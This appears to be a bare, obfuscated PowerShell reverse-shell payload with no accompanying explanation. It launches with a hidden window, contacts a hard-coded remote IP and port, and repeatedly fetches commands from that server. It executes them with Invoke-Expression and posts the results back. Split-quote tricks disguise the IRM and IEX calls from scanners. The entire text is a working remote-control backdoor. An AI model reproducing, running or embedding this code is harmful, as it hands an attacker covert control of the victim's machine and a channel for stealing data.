powershell -WindowStyle hidden { $s='185.225.74.198:4488';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=I''R''M -useb -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IR''M -useb -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=I''EX $c -EA Stop -EV e;$r=Out-String -Inp''utObje''ct $r;$t=I''R''M -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 1.9} }